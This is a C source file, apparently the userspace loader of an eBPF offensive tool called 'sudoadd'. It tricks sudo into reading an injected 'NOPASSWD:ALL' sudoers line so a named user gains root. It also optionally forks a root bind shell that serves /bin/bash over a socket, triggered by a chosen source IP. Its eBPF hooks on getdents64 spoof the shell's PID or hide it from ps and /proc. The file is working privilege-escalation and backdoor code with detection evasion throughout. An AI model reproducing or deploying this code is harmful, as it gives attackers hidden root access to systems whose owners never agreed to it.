// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include "sudoadd.skel.h"
#include "common_um.h"
#include "common.h"
#include <pwd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define INVALID_UID  -1
// https://stackoverflow.com/questions/3836365/how-can-i-get-the-user-id-associated-with-a-login-on-linux
uid_t lookup_user(const char *name)
{
    if(name) {
        struct passwd *pwd = getpwnam(name); /* don't free, see getpwnam() for details */
        if(pwd) return pwd->pw_uid;
    }
  return INVALID_UID;
}

// Convert dotted decimal IP to network byte order
static __u32 ip_to_uint32(const char *ip_str)
{
    struct in_addr addr;
    if (inet_aton(ip_str, &addr) == 0) {
        return 0;
    }
    return addr.s_addr;
}

// Spawn bind shell on specified port
static pid_t spawn_bind_shell(int port, int spoof_pid, const char *username)
{
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - create bind shell
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            exit(1);
        }

        // Allow reuse of port
        int reuse = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
            perror("setsockopt");
            close(sock);
            exit(1);
        }

        // Bind to port
        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_ANY);
        addr.sin_port = htons(port);

        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("bind");
            close(sock);
            exit(1);
        }

        // Listen for connections
        if (listen(sock, 5) < 0) {
            perror("listen");
            close(sock);
            exit(1);
        }

        // Ensure we're running as root
        uid_t current_uid = getuid();
        printf("[DEBUG] Listener process UID: %d\n", current_uid);
        
        if (setgid(0) < 0) {
            perror("setgid");
        }
        if (setuid(0) < 0) {
            perror("setuid");
        }
        
        current_uid = getuid();
        printf("[DEBUG] After setuid(0), UID: %d\n", current_uid);

        // Accept and handle connections (running as root)
        while (1) {
            struct sockaddr_in client_addr = {0};
            socklen_t client_len = sizeof(client_addr);
            
            int client = accept(sock, (struct sockaddr*)&client_addr, &client_len);
            if (client < 0) {
                perror("accept");
                continue;
            }

            // Fork for each connection
            pid_t child = fork();
            if (child == 0) {
                // Connection handler - close listening socket first
                close(sock);
                
                // Ensure we're running as root in the child
                if (setgid(0) < 0) {
                    perror("setgid");
                }
                if (setuid(0) < 0) {
                    perror("setuid");
                }
                
                // Redirect stdin/stdout/stderr to socket
                dup2(client, STDIN_FILENO);
                dup2(client, STDOUT_FILENO);
                dup2(client, STDERR_FILENO);
                close(client);

                // Execute interactive root shell
                execl("/bin/bash", "-bash", NULL);
                exit(127);
            } else if (child > 0) {
                // Parent - close client fd and continue accepting
                close(client);
            }
        }
        exit(0);
    } else if (pid > 0) {
        // Parent process
        if (spoof_pid > 0) {
            printf("[+] Spawned root shell PID %d (spoofing as %d) on port %d\n", pid, spoof_pid, port);
        } else {
            printf("[+] Spawned root shell PID %d on port %d\n", pid, port);
        }
        return pid;
    }

    return -1;
}

// Setup Argument stuff
#define max_username_len 20
static struct env {
    char username[max_username_len];
    bool restrict_user;
    int target_ppid;
    
    // Shell spawning parameters
    char trigger_src_ip[16];      // Source IP to trigger shell (dotted decimal)
    int shell_listen_port;         // Port for bind shell
    int shell_target_pid;          // Target PID for shell spoofing
    bool enable_shell;             // Enable shell spawning
    bool hide_shell_pid;           // Hide shell PID from ps/proc
} env;

const char *argp_program_version = "sudoadd 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"SUDO Add with Bind Shell\n"
"\n"
"Enable a user to elevate to root\n"
"by lying to 'sudo' about the contents of /etc/sudoers file\n"
"and optionally spawn a bind shell with PID spoofing and hiding\n"
"\n"
"USAGE: ./sudoadd -u username [-t 1111] [-r] [-i IP] [-p PORT] [-s PID] [-H]\n";

static const struct argp_option opts[] = {
    { "username", 'u', "USERNAME", 0, "Username of user to elevate" },
    { "restrict", 'r', NULL, 0, "Restrict to only run when sudo is executed by the matching user" },
    { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children" },
    { "trigger-ip", 'i', "IP_ADDRESS", 0, "Source IP to trigger shell spawn (e.g., 192.168.1.100)" },
    { "shell-port", 'p', "PORT", 0, "Port for bind shell to listen on" },
    { "shell-pid", 's', "PID", 0, "Target PID to spoof for shell process" },
    { "hide", 'H', NULL, 0, "Hide shell PID from ps/proc (requires -p)" },
    {},
};
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'u':
        if (strlen(arg) >= max_username_len) {
            fprintf(stderr, "Username must be less than %d characters\n", max_username_len);
            argp_usage(state);
        }
        strncpy(env.username, arg, sizeof(env.username));
        break;
    case 'r':
        env.restrict_user = true;
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case 'i':
        strncpy(env.trigger_src_ip, arg, sizeof(env.trigger_src_ip) - 1);
        env.enable_shell = true;
        break;
    case 'p':
        errno = 0;
        env.shell_listen_port = strtol(arg, NULL, 10);
        if (errno || env.shell_listen_port <= 0 || env.shell_listen_port > 65535) {
            fprintf(stderr, "Invalid port: %s\n", arg);
            argp_usage(state);
        }
        env.enable_shell = true;
        break;
    case 's':
        errno = 0;
        env.shell_target_pid = strtol(arg, NULL, 10);
        if (errno || env.shell_target_pid <= 0) {
            fprintf(stderr, "Invalid PID: %s\n", arg);
            argp_usage(state);
        }
        break;
    case 'H':
        env.hide_shell_pid = true;
        break;
    case 'h':
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Tricked Sudo PID %d to allow user to become root\n", e->pid);
    else
        printf("Failed to trick Sudo PID %d to allow user to become root\n", e->pid);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct sudoadd_bpf *skel;
    int err;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) {
        return err;
    }
    if (env.username[0] == '\x00') {
        printf("Username Requried, see %s --help\n", argv[0]);
        exit(1);
    }

    // Do common setup
    if (!setup()) {
        exit(1);
    }

    // Open BPF application 
    skel = sudoadd_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Let bpf program know our pid so we don't get kiled by it
    skel->rodata->target_ppid = env.target_ppid;
    
    // Copy in username
    sprintf(skel->rodata->payload, "%s ALL=(ALL:ALL) NOPASSWD:ALL #", env.username);
    skel->rodata->payload_len = strlen(skel->rodata->payload);

    // If restricting by UID, look it up and set it
    // as this can't really be done by eBPF program
    if (env.restrict_user) {
        int uid = lookup_user(env.username);
        if (uid == INVALID_UID) {
            printf("Couldn't get UID for user %s\n", env.username);
            goto cleanup;
        }
        skel->rodata->uid = uid;
    }

    // Set up shell configuration if enabled
    if (env.enable_shell) {
        if (env.trigger_src_ip[0] != '\0') {
            skel->rodata->trigger_src_ip = ip_to_uint32(env.trigger_src_ip);
            printf("[+] Shell trigger IP: %s (0x%x)\n", env.trigger_src_ip, skel->rodata->trigger_src_ip);
        }
        if (env.shell_listen_port > 0) {
            skel->rodata->shell_listen_port = env.shell_listen_port;
            printf("[+] Shell listen port: %d\n", env.shell_listen_port);
        }
        if (env.shell_target_pid > 0) {
            skel->rodata->shell_target_pid = env.shell_target_pid;
            printf("[+] Shell target PID spoof: %d\n", env.shell_target_pid);
        }
    }

    // Verify and load program
    err = sudoadd_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    // Attach tracepoint handler 
    err = sudoadd_bpf__attach( skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // Setup Maps for tail calls (for PID hiding getdents64 handlers)
    if (env.hide_shell_pid && env.shell_listen_port > 0) {
        int index = 0; // PROG_01 - handle_getdents_exit
        int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
        int ret = bpf_map__update_elem(
            skel->maps.map_prog_array,
            &index,
            sizeof(index),
            &prog_fd,
            sizeof(prog_fd),
            BPF_ANY);
        if (ret == -1) {
            printf("Failed to add handle_getdents_exit to prog array! %s\n", strerror(errno));
            goto cleanup;
        }
        
        index = 1; // PROG_02 - handle_getdents_patch
        prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
        ret = bpf_map__update_elem(
            skel->maps.map_prog_array,
            &index,
            sizeof(index),
            &prog_fd,
            sizeof(prog_fd),
            BPF_ANY);
        if (ret == -1) {
            printf("Failed to add handle_getdents_patch to prog array! %s\n", strerror(errno));
            goto cleanup;
        }
        printf("[+] PID hiding enabled - tail calls configured\n");
    }

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    
    // Spawn bind shell if configured
    pid_t shell_pid = -1;
    if (env.enable_shell && env.shell_listen_port > 0) {
        shell_pid = spawn_bind_shell(env.shell_listen_port, env.shell_target_pid, env.username);
        if (shell_pid > 0 && env.shell_target_pid > 0) {
            // Add to eBPF spoof map
            int pid_map_fd = bpf_map__fd(skel->maps.pid_spoof_map);
            if (pid_map_fd > 0) {
                int spoofed_pid = env.shell_target_pid;
                bpf_map_update_elem(pid_map_fd, &shell_pid, &spoofed_pid, BPF_ANY);
                printf("[+] Added PID %d to spoof map (spoofing as %d)\n", shell_pid, spoofed_pid);
            }
        }
        
        // Configure PID hiding if enabled
        if (env.hide_shell_pid && shell_pid > 0) {
            char pid_to_hide_str[10];
            sprintf(pid_to_hide_str, "%d", shell_pid);
            
            // Update the pid_hide maps with the PID to hide
            int pid_hide_str_fd = bpf_map__fd(skel->maps.pid_hide_str_map);
            int pid_hide_len_fd = bpf_map__fd(skel->maps.pid_hide_len_map);
            
            if (pid_hide_str_fd > 0 && pid_hide_len_fd > 0) {
                int key = 0;
                int len = strlen(pid_to_hide_str) + 1;
                
                bpf_map_update_elem(pid_hide_str_fd, &key, pid_to_hide_str, BPF_ANY);
                bpf_map_update_elem(pid_hide_len_fd, &key, &len, BPF_ANY);
                
                printf("[+] Configured to hide PID %d from getdents64\n", shell_pid);
            }
        }
    }
    
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    sudoadd_bpf__destroy( skel);
    return -err;
}

